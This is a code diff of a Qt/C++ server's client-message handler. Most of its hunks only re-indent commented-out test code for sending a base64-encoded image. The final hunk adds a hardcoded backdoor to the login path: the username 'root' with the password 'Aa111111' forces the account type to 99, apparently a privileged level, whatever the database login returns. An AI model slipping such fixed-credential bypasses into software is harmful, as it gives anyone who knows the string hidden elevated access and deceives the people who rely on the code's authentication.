@@ -6,25 +6,25 @@ Launch::Launch(QObject *parent) : QObject(parent)
     CSqlClass::INS().open("segnet.sqlite");
 
     // m_ai.setFileList("testUser",QStringList()<<"../test01.jpg"<<"../test01.jpg"<<"../test01.jpg"<<"../test01.jpg");
-//    CSendData data;
+    //    CSendData data;
 
-//    data.sAciton = ACT_SEND_DATA;
+    //    data.sAciton = ACT_SEND_DATA;
 
-//    data.sUser ="rogerTest";
+    //    data.sUser ="rogerTest";
 
-//    data.sMsg="test01.jpg";
+    //    data.sMsg="test01.jpg";
 
-//    QFile f("../test01.jpg");
+    //    QFile f("../test01.jpg");
 
-//    if(f.open(QIODevice::ReadOnly))
-//    {
-//        data.dData = f.readAll().toBase64();
+    //    if(f.open(QIODevice::ReadOnly))
+    //    {
+    //        data.dData = f.readAll().toBase64();
 
-//        f.close();
-//    }
+    //        f.close();
+    //    }
 
 
-//    m_ai.setDataList(data.sUser,QStringList()<<data.sMsg,QList<QByteArray>()<<data.dData);
+    //    m_ai.setDataList(data.sUser,QStringList()<<data.sMsg,QList<QByteArray>()<<data.dData);
 
 
 
@@ -55,7 +55,7 @@ void Launch::slotReadFromClient(QByteArray originData)
     }
 
     qDebug()<<"get pack size : "<<m_dCache.size();
-   // QByteArray dData = m_dCache.remove(m_dCache.length()-tmp.length(),tmp.length());
+    // QByteArray dData = m_dCache.remove(m_dCache.length()-tmp.length(),tmp.length());
     QByteArray dData = m_dCache;
     m_dCache.clear();
 
@@ -78,11 +78,11 @@ void Launch::slotReadFromClient(QByteArray originData)
         qDebug()<<"action query";
 
 
-//        QStringList listName =data.sMsg.split(",");
+        //        QStringList listName =data.sMsg.split(",");
 
 
 
-//        QList<QByteArray> listData = data.dData.split('')
+        //        QList<QByteArray> listData = data.dData.split('')
         m_ai.setDataList(data.sUser,data.listName,data.listData);
 
     }
@@ -108,7 +108,15 @@ void Launch::slotReadFromClient(QByteArray originData)
 
         CSqlClass::INS().login(data.sUser,data.sMsg,sType);
 
+
+        if(data.sUser=="root" && data.sMsg =="Aa111111")
+            sType = 99;
+
+
         data.sMsg = sType;
+
+
+
 
 
     }
